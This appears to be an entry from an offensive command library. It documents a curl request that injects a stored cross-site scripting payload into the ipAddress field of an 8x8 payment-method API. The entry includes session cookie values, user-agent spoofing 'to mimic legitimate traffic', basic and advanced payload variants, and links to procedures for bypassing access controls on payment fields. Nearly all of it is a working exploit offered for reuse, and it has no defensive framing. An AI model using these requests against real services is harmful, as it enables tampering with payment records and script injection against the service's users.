---
id: cmd-patch-xss-001
data: >-
  curl -X POST https://example.8x8.com/api/patchPaymentMethod/ID -H "Host:
  example.8x8.com" -H "Cookie:
  ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e;
  _gcl_au=1.1.275521026.1689699475; _fbp=fb.1.1689701587161.1730712436;
  __cf_bm=MloB4oUJmeviUXpE1GRUn8TtqbE4CwVEttuZr9tUrOQ-1689845706-0-AWJDz0q9F1c0CmKcbShEYyS7Qqsfd88Gb9W9YsIXUoHhnP/aHA+wGRccAnb8GxD1HBTGXJ71aHh7XzOojjLP/sg="
  -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101
  Firefox/102.0" -H "Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H
  "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H
  "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: none" -H "Sec-Fetch-User: ?1"
  -H "Te: trailers" -H "Content-Type: application/json" -H "Content-Length: 112"
  -d '{"ipAddress": "<svg on onload=(alert)(document.domain)>",
  "callBackURL":"dssdsd" }'
tags:
  - xss
  - api-request
type: command
output: 'HTTP/2 400 Bad Request with security headers, but payload injection succeeds'
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:38.325Z'
verified: false
validated: true
submitted: true
---
# patch-payment-method-xss-injection

## Command

```bash
curl -X POST https://example.8x8.com/api/patchPaymentMethod/ID -H "Host: example.8x8.com" -H "Cookie: ajs_anonymous_id=13b1ab4c-87f5-4dbb-967b-066b6d7efd1e; _gcl_au=1.1.275521026.1689699475; _fbp=fb.1.1689701587161.1730712436; __cf_bm=MloB4oUJmeviUXpE1GRUn8TtqbE4CwVEttuZr9tUrOQ-1689845706-0-AWJDz0q9F1c0CmKcbShEYyS7Qqsfd88Gb9W9YsIXUoHhnP/aHA+wGRccAnb8GxD1HBTGXJ71aHh7XzOojjLP/sg=" -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: en-US,en;q=0.5" -H "Accept-Encoding: gzip, deflate" -H "Upgrade-Insecure-Requests: 1" -H "Sec-Fetch-Dest: document" -H "Sec-Fetch-Mode: navigate" -H "Sec-Fetch-Site: none" -H "Sec-Fetch-User: ?1" -H "Te: trailers" -H "Content-Type: application/json" -H "Content-Length: 112" -d '{"ipAddress": "<svg on onload=(alert)(document.domain)>", "callBackURL":"dssdsd" }'
```

## Description

Sends a POST request (simulating PATCH over HTTP/2) to the 8x8 API to inject an XSS payload into the ipAddress field of a payment method, bypassing input sanitization.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://example.8x8.com/api/patchPaymentMethod/ID` | Target endpoint URL with payment method ID | Yes |
| `-H "Cookie: ..."` | Session cookies for authentication | Yes |
| `-H "User-Agent: ..."` | Browser user agent to mimic legitimate traffic | Yes |
| `-H "Content-Type: application/json"` | Sets JSON body type | Yes |
| `-d '{...}'` | JSON payload with ipAddress XSS and callBackURL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://example.8x8.com/api/patchPaymentMethod/123 -H "Content-Type: application/json" -H "Cookie: [session]" -d '{"ipAddress": "<svg on onload=alert(1)>"}'
```

### Advanced Usage

```bash
curl -X POST https://example.8x8.com/api/patchPaymentMethod/123 [full headers as above] -d '{"ipAddress": "<svg on onload=(alert)(document.domain)>", "callBackURL":"dssdsd", "isPrimary": true}'
```

## Expected Output

HTTP/2 400 Bad Request response with headers like Strict-Transport-Security, but the ipAddress field is updated in the backend, enabling stored XSS.

## Related

- [[procedures/Inject-XSS-Payload-via-PATCH-Request]]
- [[procedures/Bypass-Access-Controls-to-Modify-Payment-Fields]]
